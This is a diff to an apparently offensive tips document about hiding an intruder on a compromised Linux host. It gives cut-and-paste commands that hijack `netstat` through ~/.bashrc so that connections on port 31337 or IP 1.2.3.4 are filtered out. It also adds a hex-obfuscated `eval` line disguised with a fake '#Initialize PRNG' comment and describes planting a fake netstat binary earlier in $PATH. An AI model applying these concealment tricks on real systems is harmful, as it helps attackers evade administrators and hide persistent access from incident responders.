@@ -154,25 +154,25 @@ hide nohup sleep 1234 &>/dev/null &  # Starts and hides 'sleep 1234' as a backgr
 
 The trick is to hijack `netstat` and use grep to filter out our connection. This example filters any connection on port 31337 _or_ ip 1.2.3.4. The same should be done for `ss` (a netstat alternative).
 
-**Method 1 - Hijacking with bash-function from ~/.bashrc**
+**Method 1 - Hijacking with bash-function in ~/.bashrc**
 
 Cut & paste this to add the line to ~/.bashrc
 ```shell
 echo 'netstat(){ command netstat "$@" | grep -Fv -e :31337 -e 1.2.3.4; }' >>~/.bashrc
 ```
 
-Or cut & paste this do the same but obfuscated in ~/.bashrc:
+Or cut & paste this for an obfuscated entry to ~/.bashrc:
 ```shell
 X='netstat(){ command netstat "$@" | grep -Fv -e :31337 -e 1.2.3.4; }'
 echo "eval \$(echo $(echo "$X" | xxd -ps -c1024)|xxd -r -ps) #Initialize PRNG" >>~/.bashrc
 ```
 
-The added entry to ~/.bashrc will look like this:
+The obfuscated entry to ~/.bashrc will look like this:
 ```
 eval $(echo 6e65747374617428297b20636f6d6d616e64206e6574737461742022244022207c2067726570202d4676202d65203a3331333337202d6520312e322e332e343b207d0a|xxd -r -ps) #Initialize PRNG
 ```
 
-**Method 2 - Hijacking with a binary in PATH**
+**Method 2 - Hijacking with a binary in $PATH**
 
 Hide a hijacking binary in /usr/local/sbin whereas the real netstat is in /usr/bin. On a default Debian (and most Linux) the PATH variables (`echo $PATH`) lists /usr/local/sbin _before_ /usr/bin. This means that the hijacking binary (netstat) will be executed instead of /usr/bin/netstat.
 
